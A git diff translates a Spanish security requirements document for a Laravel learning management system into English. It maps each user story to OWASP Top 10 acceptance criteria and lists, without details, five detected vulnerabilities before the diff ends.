@@ -1,324 +1,324 @@
-# Seguridad por Historia de Usuario
+# Security by User Story
 
-Documento de requisitos de seguridad y criterios de aceptación específicos del LMS-CMS, derivados de las historias de usuario definidas en [readme.md](./readme.md#5-historias-de-usuario).
+Security requirements and acceptance criteria specific to the LMS-CMS, derived from the user stories defined in [readme.md](./readme.md#5-user-stories).
 
-## Índice
+## Table of Contents
 
-1. [Alcance y exclusiones](#alcance-y-exclusiones)
-2. [Criterios por historia de usuario (HU-1 … HU-12)](#hu-1--crear-cursos)
-3. [Matriz resumen OWASP ↔ Historias](#matriz-resumen-owasp--historias-de-usuario)
-4. [Trazabilidad](#trazabilidad)
-5. [Análisis de vulnerabilidades detectadas (OWASP Top 10)](#análisis-de-vulnerabilidades-detectadas-owasp-top-10)
-   - [V1 — XSS almacenado en contenido de lecciones](#v1--xss-almacenado-en-contenido-de-lecciones-a03-injection)
-   - [V2 — Acceso directo a archivos subidos](#v2--acceso-directo-a-archivos-subidos-sin-autorización-a01-broken-access-control)
-   - [V3 — URLs de embed sin validar en plugins](#v3--urls-de-embed-sin-validar-en-plugins-a03-injection--contenido-embebido-malicioso)
-   - [V4 — Integridad del quiz comprometida](#v4--integridad-del-quiz-comprometida-a04-insecure-design--a08-integrity-failures)
-   - [V5 — Escalada de privilegios en matriculación](#v5--escalada-de-privilegios-en-matriculación-a01-broken-access-control)
-
----
-
-Este documento cubre únicamente los riesgos y controles **ligados al flujo funcional de cada historia de usuario**. Los siguientes controles se consideran **transversales a la aplicación** y se documentan/implementan a nivel global (ver sección 2.5 de `readme.md`):
-
-- Autenticación, gestión de sesiones y cierre de sesión.
-- Autorización basada en roles (`teacher` / `student`) y middleware `EnsureRole`.
-- Cifrado de datos en tránsito (TLS/HTTPS).
-- Protección CSRF en formularios.
-- Hash de contraseñas y políticas de credenciales.
-
-Las referencias a OWASP se alinean con el [OWASP Top 10 (2021)](https://owasp.org/Top10/).
+1. [Scope and exclusions](#scope-and-exclusions)
+2. [Criteria by user story (HU-1 … HU-12)](#hu-1--create-courses)
+3. [Summary matrix OWASP ↔ User stories](#summary-matrix-owasp--user-stories)
+4. [Traceability](#traceability)
+5. [Detected vulnerability analysis (OWASP Top 10)](#detected-vulnerability-analysis-owasp-top-10)
+   - [V1 — Stored XSS in lesson content](#v1--stored-xss-in-lesson-content-a03-injection)
+   - [V2 — Unauthorized direct access to uploaded files](#v2--unauthorized-direct-access-to-uploaded-files-a01-broken-access-control)
+   - [V3 — Unvalidated embed URLs in plugins](#v3--unvalidated-embed-urls-in-plugins-a03-injection--malicious-embedded-content)
+   - [V4 — Compromised quiz integrity](#v4--compromised-quiz-integrity-a04-insecure-design--a08-integrity-failures)
+   - [V5 — Privilege escalation in enrollment](#v5--privilege-escalation-in-enrollment-a01-broken-access-control)
 
 ---
 
-## HU-1 — Crear cursos
+This document covers only the risks and controls **tied to the functional flow of each user story**. The following controls are considered **application-wide** and are documented/implemented at the global level (see section 2.5 of `readme.md`):
 
-**Historia de usuario:** Como profesor quiero crear cursos para organizar mi contenido educativo.
+- Authentication, session management, and logout.
+- Role-based authorization (`teacher` / `student`) and the `EnsureRole` middleware.
+- Data encryption in transit (TLS/HTTPS).
+- CSRF protection on forms.
+- Password hashing and credential policies.
 
-### Criterios de aceptación de seguridad
-
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-1-S01 | Los campos de creación de curso (título, descripción, metadatos) se validan en servidor con tipos, longitudes máximas y conjunto de caracteres permitidos; los errores no revelan estructura interna de la base de datos. | A03 Injection |
-| HU-1-S02 | Cada curso queda vinculado al `user_id` del profesor creador; las operaciones posteriores sobre ese curso verifican **propiedad del recurso**, no solo el rol genérico. | A01 Broken Access Control |
-| HU-1-S03 | Solo se permiten asignar en creación los atributos definidos en la lista blanca del modelo (`$fillable` / DTO); campos sensibles (`id`, `status`, `user_id` ajeno) no son asignables desde la petición. | A04 Insecure Design |
-| HU-1-S04 | El título y la descripción se escapan o sanitizan al renderizar en vistas Blade para evitar almacenamiento y ejecución de XSS. | A03 Injection |
-
-### Requisitos no funcionales
-
-- Longitud máxima de título: 255 caracteres; descripción: límite configurable (p. ej. 10 000 caracteres).
-- Respuesta ante intento de creación con datos inválidos: HTTP 422 con mensajes genéricos.
-- Registro de auditoría (usuario, timestamp, `course_id`) en operaciones de alta.
+OWASP references align with the [OWASP Top 10 (2021)](https://owasp.org/Top10/).
 
 ---
 
-## HU-2 — Añadir lecciones a un curso
+## HU-1 — Create courses
 
-**Historia de usuario:** Como profesor quiero añadir lecciones a un curso para estructurar el material.
+**User story:** As a teacher, I want to create courses to organize my educational content.
 
-### Criterios de aceptación de seguridad
+### Security acceptance criteria
 
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-2-S01 | La lección solo puede crearse si el `course_id` pertenece al profesor autenticado; peticiones con `course_id` de terceros devuelven HTTP 403/404 sin filtrar existencia del recurso. | A01 Broken Access Control |
-| HU-2-S02 | El campo `content` (JSON) se valida contra un esquema permitido (tipos de bloque, profundidad, tamaño máximo en bytes); JSON malformado o excesivamente grande se rechaza. | A03 Injection / A04 Insecure Design |
-| HU-2-S03 | Al renderizar el contenido de la lección, cualquier fragmento HTML/texto procedente del JSON se trata como no confiable (escape contextual o sanitización con lista blanca). | A03 Injection |
-| HU-2-S04 | La posición (`position`) y `due_at` se validan en servidor; no se aceptan valores negativos, fechas incoherentes ni manipulación de orden fuera del curso autorizado. | A04 Insecure Design |
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-1-S01 | Course creation fields (title, description, metadata) are validated on the server with types, maximum lengths, and allowed character sets; errors do not reveal internal database structure. | A03 Injection |
+| HU-1-S02 | Each course is linked to the creating teacher's `user_id`; subsequent operations on that course verify **resource ownership**, not just the generic role. | A01 Broken Access Control |
+| HU-1-S03 | Only attributes defined in the model whitelist (`$fillable` / DTO) may be assigned at creation; sensitive fields (`id`, `status`, foreign `user_id`) are not assignable from the request. | A04 Insecure Design |
+| HU-1-S04 | Title and description are escaped or sanitized when rendered in Blade views to prevent XSS storage and execution. | A03 Injection |
 
-### Requisitos no funcionales
+### Non-functional requirements
 
-- Tamaño máximo del JSON de contenido: definido y aplicado en servidor (p. ej. 512 KB).
-- Inserción de lección y preguntas asociadas en transacción atómica para evitar estados inconsistentes.
-
----
-
-## HU-3 — Publicar un curso
-
-**Historia de usuario:** Como profesor quiero publicar un curso para que los estudiantes accedan.
-
-### Criterios de aceptación de seguridad
-
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-3-S01 | La transición de estado `draft` → `published` solo es ejecutable por el propietario del curso; no existe endpoint que permita publicar cursos ajenos mediante manipulación de identificadores. | A01 Broken Access Control |
-| HU-3-S02 | No se permite publicar un curso sin al menos una lección válida (regla de negocio que reduce exposición de recursos vacíos o mal configurados). | A04 Insecure Design |
-| HU-3-S03 | Tras publicar, las respuestas de listado y detalle para estudiantes no incluyen metadatos internos de borrador ni campos de depuración. | A01 Broken Access Control |
-| HU-3-S04 | La invalidación de caché del listado de cursos publicados se ejecuta de forma controlada para evitar servir contenido obsoleto tras cambios de visibilidad. | A08 Software and Data Integrity Failures |
-
-### Requisitos no funcionales
-
-- La acción de publicación es idempotente: repetir la petición sobre un curso ya publicado no altera integridad ni genera efectos secundarios no deseados.
-- Evento de auditoría registrado al cambiar el estado de publicación.
+- Maximum title length: 255 characters; description: configurable limit (e.g. 10,000 characters).
+- Response to invalid creation attempts: HTTP 422 with generic messages.
+- Audit logging (user, timestamp, `course_id`) on create operations.
 
 ---
 
-## HU-4 — Plugins interactivos con drag & drop
+## HU-2 — Add lessons to a course
 
-**Historia de usuario:** Como profesor quiero añadir plugins interactivos con drag & drop.
+**User story:** As a teacher, I want to add lessons to a course to structure the material.
 
-### Criterios de aceptación de seguridad
+### Security acceptance criteria
 
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-4-S01 | Las subidas de archivos (vídeo, imagen, adjuntos) validan extensión, MIME real, tamaño máximo (128 MB) y almacenan fuera del directorio público ejecutable; el acceso se sirve mediante rutas controladas, no por URL directa predecible. | A01 Broken Access Control / A05 Security Misconfiguration |
-| HU-4-S02 | Se rechazan archivos con extensiones ejecutables (`.php`, `.js`, `.svg` con script, etc.) y dobles extensiones engañosas. | A03 Injection |
-| HU-4-S03 | Los plugins `video_embed` y `h5p_embed` validan esquema y dominio permitido; se rechazan URLs que permitan contenido embebido malicioso (phishing, clickjacking) o iframes hacia hosts internos no previstos. | A03 Injection |
-| HU-4-S04 | La configuración JSON de cada instancia de plugin se valida por `plugin_type` (campos obligatorios, tipos y límites); no se aceptan claves arbitrarias que alteren comportamiento del motor de renderizado. | A08 Software and Data Integrity Failures |
-| HU-4-S05 | Contenido H5P y bloques HTML se renderizan en contexto restringido (iframe `sandbox` o sanitización estricta) para mitigar XSS almacenado. | A03 Injection |
-| HU-4-S06 | Las operaciones de reordenamiento y borrado de plugins verifican que la instancia pertenece a una lección del curso del profesor solicitante. | A01 Broken Access Control |
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-2-S01 | A lesson may only be created if the `course_id` belongs to the authenticated teacher; requests with a third-party `course_id` return HTTP 403/404 without leaking resource existence. | A01 Broken Access Control |
+| HU-2-S02 | The `content` field (JSON) is validated against an allowed schema (block types, depth, maximum size in bytes); malformed or oversized JSON is rejected. | A03 Injection / A04 Insecure Design |
+| HU-2-S03 | When rendering lesson content, any HTML/text fragment from the JSON is treated as untrusted (contextual escaping or whitelist sanitization). | A03 Injection |
+| HU-2-S04 | `position` and `due_at` are validated on the server; negative values, inconsistent dates, or order manipulation outside the authorized course are not accepted. | A04 Insecure Design |
 
-### Requisitos no funcionales
+### Non-functional requirements
 
-- Límite de instancias de plugin por lección (p. ej. 50) para mitigar agotamiento de recursos.
-- Nombres de fichero almacenados con identificadores no predecibles (UUID), nunca el nombre original del cliente.
+- Maximum JSON content size: defined and enforced on the server (e.g. 512 KB).
+- Lesson and associated question insertion in an atomic transaction to avoid inconsistent states.
 
 ---
 
-## HU-5 — Gestión dinámica de preguntas del quiz
+## HU-3 — Publish a course
 
-**Historia de usuario:** Como profesor quiero gestionar preguntas del quiz dinámicamente.
+**User story:** As a teacher, I want to publish a course so students can access it.
 
-### Criterios de aceptación de seguridad
+### Security acceptance criteria
 
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-5-S01 | El texto de la pregunta y las opciones se validan (longitud, número mínimo/máximo de opciones ≥ 2) y se sanitizan al mostrar. | A03 Injection |
-| HU-5-S02 | La respuesta correcta (`correct_answer`) y el detalle de corrección **no** se incluyen en respuestas API o vistas del estudiante antes del envío del quiz. | A01 Broken Access Control |
-| HU-5-S03 | Las opciones JSON se serializan de forma segura; no se evalúa código ni se interpretan plantillas del lado del servidor a partir del contenido del profesor. | A03 Injection |
-| HU-5-S04 | Alta, edición y borrado de preguntas verifican que la lección/cuestionario pertenece al curso del profesor autenticado. | A01 Broken Access Control |
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-3-S01 | The `draft` → `published` state transition may only be executed by the course owner; no endpoint allows publishing third-party courses by manipulating identifiers. | A01 Broken Access Control |
+| HU-3-S02 | A course cannot be published without at least one valid lesson (business rule that reduces exposure of empty or misconfigured resources). | A04 Insecure Design |
+| HU-3-S03 | After publishing, listing and detail responses for students do not include internal draft metadata or debug fields. | A01 Broken Access Control |
+| HU-3-S04 | Cache invalidation for the published course listing runs in a controlled manner to avoid serving stale content after visibility changes. | A08 Software and Data Integrity Failures |
 
-### Requisitos no funcionales
+### Non-functional requirements
 
-- Límite de preguntas por lección (p. ej. 100) y de opciones por pregunta (p. ej. 10).
-- Inserción masiva de preguntas dentro de transacción con rollback ante fallo parcial.
-
----
-
-## HU-6 — Asignar usuarios a un curso (drag & drop)
-
-**Historia de usuario:** Como profesor quiero asignar usuarios a un curso mediante drag & drop.
-
-### Criterios de aceptación de seguridad
-
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-6-S01 | Solo se pueden matricular usuarios existentes con rol `student`; no se crean usuarios ni se elevan privilegios desde el panel de matriculación. | A04 Insecure Design |
-| HU-6-S02 | Las APIs JSON de matriculación (`POST`/`DELETE`) verifican propiedad del curso y devuelven 403/404 ante `course_id` o `user_id` no autorizados. | A01 Broken Access Control |
-| HU-6-S03 | Se impide la matriculación duplicada y se valida la integridad referencial (`user_id`, `course_id`) en servidor, independientemente del estado del cliente drag & drop. | A08 Software and Data Integrity Failures |
-| HU-6-S04 | Las respuestas del panel de matriculación no exponen datos personales innecesarios (solo identificadores y nombre/email requeridos para la operación). | A02 Cryptographic Failures* |
-
-\* *Minimización de exposición de PII en el contexto de la funcionalidad, no cifrado en tránsito.*
-
-### Requisitos no funcionales
-
-- Límite de peticiones de matriculación por minuto por curso (rate limiting funcional) para mitigar abuso automatizado.
-- Registro de auditoría: quién matriculó/desmatriculó a quién y cuándo.
+- The publish action is idempotent: repeating the request on an already published course does not alter integrity or cause unwanted side effects.
+- Audit event logged when publication state changes.
 
 ---
 
-## HU-7 — Ver cursos publicados (estudiante)
+## HU-4 — Interactive plugins with drag & drop
 
-**Historia de usuario:** Como estudiante quiero ver cursos publicados.
+**User story:** As a teacher, I want to add interactive plugins with drag & drop.
 
-### Criterios de aceptación de seguridad
+### Security acceptance criteria
 
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-7-S01 | El listado y detalle de cursos para estudiantes filtran estrictamente por `status = published`; cursos en `draft` no son accesibles ni por enumeración de IDs. | A01 Broken Access Control |
-| HU-7-S02 | Un estudiante no matriculado no accede al contenido de lecciones de un curso publicado hasta completar la matriculación (si aplica la regla de negocio). | A01 Broken Access Control |
-| HU-7-S03 | Las respuestas no incluyen datos del profesor más allá de lo necesario (p. ej. no exponer email completo si no es requisito funcional). | A02 Cryptographic Failures* |
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-4-S01 | File uploads (video, image, attachments) validate extension, actual MIME type, maximum size (128 MB), and are stored outside the executable public directory; access is served through controlled routes, not via predictable direct URLs. | A01 Broken Access Control / A05 Security Misconfiguration |
+| HU-4-S02 | Files with executable extensions (`.php`, `.js`, `.svg` with script, etc.) and deceptive double extensions are rejected. | A03 Injection |
+| HU-4-S03 | `video_embed` and `h5p_embed` plugins validate allowed scheme and domain; URLs that allow malicious embedded content (phishing, clickjacking) or iframes to unexpected internal hosts are rejected. | A03 Injection |
+| HU-4-S04 | Each plugin instance's JSON configuration is validated by `plugin_type` (required fields, types, and limits); arbitrary keys that alter renderer behavior are not accepted. | A08 Software and Data Integrity Failures |
+| HU-4-S05 | H5P content and HTML blocks are rendered in a restricted context (iframe `sandbox` or strict sanitization) to mitigate stored XSS. | A03 Injection |
+| HU-4-S06 | Plugin reorder and delete operations verify that the instance belongs to a lesson in the requesting teacher's course. | A01 Broken Access Control |
 
-### Requisitos no funcionales
+### Non-functional requirements
 
-- Paginación obligatoria en listados para evitar respuestas voluminosas susceptibles a agotamiento de recursos.
-
----
-
-## HU-8 — Visualizar lecciones con plugins (estudiante)
-
-**Historia de usuario:** Como estudiante quiero visualizar lecciones con plugins interactivos.
-
-### Criterios de aceptación de seguridad
-
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-8-S01 | El acceso a `/lessons/{lesson}` verifica matriculación en el curso y estado publicado; IDs de lección ajenos devuelven 403/404. | A01 Broken Access Control |
-| HU-8-S02 | Todo contenido generado por plugins del profesor se trata como no confiable al renderizar (escape/sanitización/CSP) para prevenir XSS almacenado cross-usuario. | A03 Injection |
-| HU-8-S03 | Los recursos multimedia servidos desde almacenamiento validan que el solicitante tiene acceso al curso/lección asociada, no solo la URL del fichero. | A01 Broken Access Control |
-| HU-8-S04 | Las interacciones con plugins (`/plugins/instances/{instance}/interact`) validan que la instancia pertenece a la lección visible por el estudiante. | A01 Broken Access Control |
-
-### Requisitos no funcionales
-
-- Cabeceras de seguridad en respuestas de lección: `Content-Security-Policy` restrictiva para iframes y scripts inline procedentes de contenido educativo.
-- Desactivar ejecución de JavaScript inline no sanitizado en bloques de código del profesor salvo en entorno aislado.
+- Limit on plugin instances per lesson (e.g. 50) to mitigate resource exhaustion.
+- Stored filenames use non-predictable identifiers (UUID), never the client's original name.
 
 ---
 
-## HU-9 — Responder cuestionarios y recibir puntuación
+## HU-5 — Dynamic quiz question management
 
-**Historia de usuario:** Como estudiante quiero responder cuestionarios y recibir puntuación.
+**User story:** As a teacher, I want to manage quiz questions dynamically.
 
-### Criterios de aceptación de seguridad
+### Security acceptance criteria
 
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-9-S01 | La puntuación se calcula **exclusivamente en servidor** a partir de las respuestas enviadas y las preguntas almacenadas; el cliente no puede enviar `score` ni `total` manipulables. | A04 Insecure Design |
-| HU-9-S02 | Las respuestas enviadas se validan contra los IDs de pregunta existentes en la lección; opciones fuera de conjunto o preguntas ajenas se rechazan. | A03 Injection |
-| HU-9-S03 | Se aplica política de reenvío definida (una entrega por lección/usuario o ventana temporal); reintentos no autorizados no sobrescriben resultados sin regla explícita. | A08 Software and Data Integrity Failures |
-| HU-9-S04 | La respuesta al estudiante tras el envío no revela las respuestas correctas de otras preguntas ni de otros usuarios. | A01 Broken Access Control |
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-5-S01 | Question text and options are validated (length, minimum/maximum number of options ≥ 2) and sanitized on display. | A03 Injection |
+| HU-5-S02 | The correct answer (`correct_answer`) and correction details **are not** included in API responses or student views before quiz submission. | A01 Broken Access Control |
+| HU-5-S03 | JSON options are serialized safely; no code is evaluated and no server-side templates are interpreted from teacher content. | A03 Injection |
+| HU-5-S04 | Question create, update, and delete operations verify that the lesson/quiz belongs to the authenticated teacher's course. | A01 Broken Access Control |
 
-### Requisitos no funcionales
+### Non-functional requirements
 
-- Tiempo máximo de procesamiento del envío acotado; respuesta HTTP 422 ante payload malformado.
-- Persistencia de `quiz_results` vinculada a `user_id` + `lesson_id` con restricción de unicidad según política de negocio.
-
----
-
-## HU-10 — Ver progreso del estudiante
-
-**Historia de usuario:** Como estudiante quiero ver mi progreso.
-
-### Criterios de aceptación de seguridad
-
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-10-S01 | Las consultas de progreso filtran por `user_id` de la sesión autenticada; no es posible obtener progreso de otro estudiante variando parámetros. | A01 Broken Access Control |
-| HU-10-S02 | Los endpoints y vistas de progreso no aceptan `user_id` como parámetro manipulable por el cliente. | A01 Broken Access Control |
-| HU-10-S03 | Los datos agregados mostrados al estudiante provienen únicamente de cursos en los que está matriculado. | A01 Broken Access Control |
-
-### Requisitos no funcionales
-
-- Las marcas de lección completada se registran en servidor tras validar consumo real de la lección (no solo petición GET).
+- Limit on questions per lesson (e.g. 100) and options per question (e.g. 10).
+- Bulk question insertion within a transaction with rollback on partial failure.
 
 ---
 
-## HU-11 — Calendario académico y eventos propios (profesor)
+## HU-6 — Assign users to a course (drag & drop)
 
-**Historia de usuario:** Como profesor quiero ver un calendario académico mensual y crear eventos propios para planificar el curso.
+**User story:** As a teacher, I want to assign users to a course via drag & drop.
 
-### Criterios de aceptación de seguridad
+### Security acceptance criteria
 
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-11-S01 | El CRUD de `academic_calendar_events` verifica que el evento pertenece al profesor creador o a un curso de su propiedad; edición/borrado por ID ajeno devuelve 403/404. | A01 Broken Access Control |
-| HU-11-S02 | Los campos `title`, `type`, `starts_at` y `ends_at` se validan en servidor (`ends_at` ≥ `starts_at`, rango de fechas razonable, tipos de evento en lista blanca). | A03 Injection / A04 Insecure Design |
-| HU-11-S03 | El título y descripción del evento se escapan al renderizar en el calendario para evitar XSS almacenado visible por estudiantes matriculados. | A03 Injection |
-| HU-11-S04 | Los eventos derivados de lecciones (`due_at`) y matriculaciones solo muestran información del ámbito académico del usuario (curso propio o matriculado). | A01 Broken Access Control |
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-6-S01 | Only existing users with the `student` role may be enrolled; no users are created and no privileges are elevated from the enrollment panel. | A04 Insecure Design |
+| HU-6-S02 | Enrollment JSON APIs (`POST`/`DELETE`) verify course ownership and return 403/404 for unauthorized `course_id` or `user_id`. | A01 Broken Access Control |
+| HU-6-S03 | Duplicate enrollment is prevented and referential integrity (`user_id`, `course_id`) is validated on the server, regardless of drag & drop client state. | A08 Software and Data Integrity Failures |
+| HU-6-S04 | Enrollment panel responses do not expose unnecessary personal data (only identifiers and name/email required for the operation). | A02 Cryptographic Failures* |
 
-### Requisitos no funcionales
+\* *PII exposure minimization in the context of this functionality, not encryption in transit.*
 
-- Límite de eventos personalizados por profesor/curso (p. ej. 500) para mitigar abuso de almacenamiento.
-- Borrado lógico o físico con confirmación en UI; operación registrada en auditoría.
+### Non-functional requirements
 
----
-
-## HU-12 — Cambio de idioma de la interfaz (ES/EN)
-
-**Historia de usuario:** Como usuario quiero cambiar el idioma de la interfaz (ES/EN) y ver la navegación traducida.
-
-### Criterios de aceptación de seguridad
-
-| ID | Criterio | OWASP |
-|----|----------|-------|
-| HU-12-S01 | El parámetro `locale` en `/locale/{locale}` solo acepta valores de lista blanca (`es`, `en`); cualquier otro valor se rechaza o normaliza sin error verbose. | A03 Injection |
-| HU-12-S02 | Tras el cambio de idioma, la redirección vuelve a una ruta interna relativa validada; no se aceptan URLs absolutas externas en parámetros de retorno (prevención de open redirect). | A01 Broken Access Control |
-| HU-12-S03 | El valor de locale se almacena en sesión/server-side; no se propaga a consultas SQL ni a inclusión de ficheros de traducción fuera de `lang/{locale}/`. | A03 Injection |
-| HU-12-S04 | Las cadenas inyectadas vía `window.lmsT()` en el cliente provienen exclusivamente de los ficheros de traducción del servidor, no de entrada del usuario. | A03 Injection |
-
-### Requisitos no funcionales
-
-- El middleware `SetLocale` se ejecuta antes del renderizado de cualquier vista autenticada.
-- Los ficheros de idioma adicionales futuros deben seguir la misma convención de ruta y revisión de contenido estático.
+- Limit on enrollment requests per minute per course (functional rate limiting) to mitigate automated abuse.
+- Audit logging: who enrolled/unenrolled whom and when.
 
 ---
 
-## Matriz resumen OWASP ↔ Historias de usuario
+## HU-7 — View published courses (student)
 
-| Categoría OWASP Top 10 | Historias donde aplica (específico) |
-|------------------------|-------------------------------------|
+**User story:** As a student, I want to view published courses.
+
+### Security acceptance criteria
+
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-7-S01 | Course listing and detail for students strictly filter by `status = published`; courses in `draft` are not accessible, including via ID enumeration. | A01 Broken Access Control |
+| HU-7-S02 | An unenrolled student does not access lesson content of a published course until enrollment is completed (if the business rule applies). | A01 Broken Access Control |
+| HU-7-S03 | Responses do not include teacher data beyond what is necessary (e.g. do not expose full email if not a functional requirement). | A02 Cryptographic Failures* |
+
+### Non-functional requirements
+
+- Mandatory pagination on listings to avoid voluminous responses susceptible to resource exhaustion.
+
+---
+
+## HU-8 — View lessons with plugins (student)
+
+**User story:** As a student, I want to view lessons with interactive plugins.
+
+### Security acceptance criteria
+
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-8-S01 | Access to `/lessons/{lesson}` verifies enrollment in the course and published status; foreign lesson IDs return 403/404. | A01 Broken Access Control |
+| HU-8-S02 | All content generated by teacher plugins is treated as untrusted when rendered (escape/sanitization/CSP) to prevent cross-user stored XSS. | A03 Injection |
+| HU-8-S03 | Multimedia resources served from storage verify that the requester has access to the associated course/lesson, not just the file URL. | A01 Broken Access Control |
+| HU-8-S04 | Plugin interactions (`/plugins/instances/{instance}/interact`) verify that the instance belongs to the lesson visible to the student. | A01 Broken Access Control |
+
+### Non-functional requirements
+
+- Security headers on lesson responses: restrictive `Content-Security-Policy` for iframes and inline scripts from educational content.
+- Disable execution of unsanitized inline JavaScript in teacher code blocks except in an isolated environment.
+
+---
+
+## HU-9 — Answer quizzes and receive a score
+
+**User story:** As a student, I want to answer quizzes and receive a score.
+
+### Security acceptance criteria
+
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-9-S01 | The score is calculated **exclusively on the server** from submitted answers and stored questions; the client cannot submit manipulable `score` or `total`. | A04 Insecure Design |
+| HU-9-S02 | Submitted answers are validated against question IDs existing in the lesson; out-of-set options or foreign questions are rejected. | A03 Injection |
+| HU-9-S03 | A defined resubmission policy applies (one submission per lesson/user or time window); unauthorized retries do not overwrite results without an explicit rule. | A08 Software and Data Integrity Failures |
+| HU-9-S04 | The response to the student after submission does not reveal correct answers for other questions or other users. | A01 Broken Access Control |
+
+### Non-functional requirements
+
+- Bounded maximum processing time for submission; HTTP 422 response for malformed payload.
+- `quiz_results` persistence linked to `user_id` + `lesson_id` with uniqueness constraint per business policy.
+
+---
+
+## HU-10 — View student progress
+
+**User story:** As a student, I want to view my progress.
+
+### Security acceptance criteria
+
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-10-S01 | Progress queries filter by the authenticated session's `user_id`; another student's progress cannot be obtained by varying parameters. | A01 Broken Access Control |
+| HU-10-S02 | Progress endpoints and views do not accept a client-manipulable `user_id` parameter. | A01 Broken Access Control |
+| HU-10-S03 | Aggregated data shown to the student comes only from courses in which they are enrolled. | A01 Broken Access Control |
+
+### Non-functional requirements
+
+- Lesson completion markers are recorded on the server after validating actual lesson consumption (not just a GET request).
+
+---
+
+## HU-11 — Academic calendar and custom events (teacher)
+
+**User story:** As a teacher, I want to view a monthly academic calendar and create custom events to plan the course.
+
+### Security acceptance criteria
+
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-11-S01 | `academic_calendar_events` CRUD verifies that the event belongs to the creating teacher or to a course they own; edit/delete by foreign ID returns 403/404. | A01 Broken Access Control |
+| HU-11-S02 | `title`, `type`, `starts_at`, and `ends_at` fields are validated on the server (`ends_at` ≥ `starts_at`, reasonable date range, event types on a whitelist). | A03 Injection / A04 Insecure Design |
+| HU-11-S03 | Event title and description are escaped when rendered in the calendar to prevent stored XSS visible to enrolled students. | A03 Injection |
+| HU-11-S04 | Events derived from lessons (`due_at`) and enrollments only show information within the user's academic scope (own or enrolled course). | A01 Broken Access Control |
+
+### Non-functional requirements
+
+- Limit on custom events per teacher/course (e.g. 500) to mitigate storage abuse.
+- Logical or physical deletion with UI confirmation; operation logged in audit trail.
+
+---
+
+## HU-12 — Interface language switch (ES/EN)
+
+**User story:** As a user, I want to change the interface language (ES/EN) and see translated navigation.
+
+### Security acceptance criteria
+
+| ID | Criterion | OWASP |
+|----|-----------|-------|
+| HU-12-S01 | The `locale` parameter in `/locale/{locale}` only accepts whitelist values (`es`, `en`); any other value is rejected or normalized without verbose errors. | A03 Injection |
+| HU-12-S02 | After language change, redirection returns to a validated internal relative route; absolute external URLs in return parameters are not accepted (open redirect prevention). | A01 Broken Access Control |
+| HU-12-S03 | The locale value is stored in session/server-side; it is not propagated to SQL queries or translation file inclusion outside `lang/{locale}/`. | A03 Injection |
+| HU-12-S04 | Strings injected via `window.lmsT()` on the client come exclusively from server translation files, not from user input. | A03 Injection |
+
+### Non-functional requirements
+
+- The `SetLocale` middleware runs before rendering any authenticated view.
+- Future additional language files must follow the same path convention and static content review.
+
+---
+
+## Summary matrix OWASP ↔ User stories
+
+| OWASP Top 10 category | User stories where it applies (specific) |
+|-----------------------|------------------------------------------|
 | A01 Broken Access Control | HU-1, HU-2, HU-3, HU-4, HU-5, HU-6, HU-7, HU-8, HU-9, HU-10, HU-11, HU-12 |
-| A02 Cryptographic Failures (minimización PII) | HU-6, HU-7 |
-| A03 Injection (XSS, validación entrada) | HU-1, HU-2, HU-4, HU-5, HU-8, HU-9, HU-11, HU-12 |
+| A02 Cryptographic Failures (PII minimization) | HU-6, HU-7 |
+| A03 Injection (XSS, input validation) | HU-1, HU-2, HU-4, HU-5, HU-8, HU-9, HU-11, HU-12 |
 | A04 Insecure Design | HU-1, HU-2, HU-3, HU-6, HU-9, HU-11 |
-| A05 Security Misconfiguration | HU-4 (subidas y límites) |
+| A05 Security Misconfiguration | HU-4 (uploads and limits) |
 | A08 Software and Data Integrity Failures | HU-3, HU-4, HU-6, HU-9 |
-| A10 Server-Side Request Forgery | HU-4 (embeds de vídeo/enlace) |
+| Malicious embedded content (video/H5P embeds) | HU-4, HU-8 |
 
 ---
 
-## Trazabilidad
+## Traceability
 
-| Historia | Ticket relacionado | PR relacionado |
-|----------|-------------------|----------------|
+| User story | Related ticket | Related PR |
+|------------|----------------|------------|
 | HU-1, HU-2, HU-3 | Ticket 2 | PR 2 |
 | HU-4 | Ticket 4 | PR 4 |
 | HU-5, HU-9, HU-10 | Ticket 3 | PR 3 |
 | HU-6 | Ticket 5 | PR 5 |
-| HU-4 (subidas) | Ticket 6 | PR 6 |
+| HU-4 (uploads) | Ticket 6 | PR 6 |
 | HU-11 | Ticket 7 | PR 7 |
 | HU-12 | Ticket 8 | PR 8 |
 
 ---
 
-## Análisis de vulnerabilidades detectadas (OWASP Top 10)
+## Detected vulnerability analysis (OWASP Top 10)
 
-Análisis estático del código en [BurgosAngel/codigofinal](https://github.com/BurgosAngel/codigofinal/tree/angel-burgos-r/codigofinal/lms-cms-laravel12) (rama `angel-burgos-r`), priorizado por impacto en las historias de usuario (HU-2, HU-4, HU-6, HU-8, HU-9). Se excluyen controles ya cubiertos a nivel global (autenticación, roles, TLS, CSRF).
+Static code analysis of [BurgosAngel/codigofinal](https://github.com/BurgosAngel/codigofinal/tree/angel-burgos-r/codigofinal/lms-cms-laravel12) (`angel-burgos-r` branch), prioritized by impact on user stories (HU-2, HU-4, HU-6, HU-8, HU-9). Controls already covered at the global level (authentication, roles, TLS, CSRF) are excluded.
 
-Cada vulnerabilidad se documenta de forma completa — descripción, evidencia, ejemplo de explotación e impacto, y solución — antes de pasar a la siguiente.
